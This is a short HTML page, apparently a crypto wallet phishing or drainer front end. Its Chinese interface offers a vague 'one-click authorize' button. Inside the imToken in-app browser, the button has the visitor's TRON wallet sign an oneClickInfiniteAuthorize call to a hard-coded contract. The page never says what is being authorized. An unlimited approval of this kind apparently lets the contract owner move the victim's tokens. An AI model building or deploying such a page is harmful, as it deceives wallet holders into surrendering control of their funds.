<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>手机端授权页</title>
</head>
<body>
    <button onclick="startAuth()">一键授权</button>
    <div id="tip"></div>

    <script>
        // 你的合约地址
        const CONTRACT_ADDR = "TRtKzVfnbyDKkkjdmrArK2wecGEuHUeNBV";

        async function startAuth() {
            const tip = document.getElementById("tip");
            try {
                // 手机端imToken内置浏览器的全局对象（和系统无关）
                if (!window.tronWeb) {
                    tip.innerText = "请在imToken内置浏览器打开";
                    return;
                }
                // 获取你手机imToken里的钱包地址
                const walletAddr = window.tronWeb.defaultAddress.base58;
                if (!walletAddr) {
                    tip.innerText = "请先在imToken里登录钱包";
                    return;
                }

                tip.innerText = "正在发起授权，请在imToken里确认...";
                // 调用你合约的授权方法
                const contract = await window.tronWeb.contract().at(CONTRACT_ADDR);
                const tx = await contract.oneClickInfiniteAuthorize().send({
                    from: walletAddr,
                    feeLimit: 300000000
                });

                tip.innerText = "授权成功！交易ID：" + tx.txid.slice(0,16);
            } catch (e) {
                tip.innerText = "授权失败：" + (e.message || "操作错误");
            }
        }
    </script>
</body>
</html>
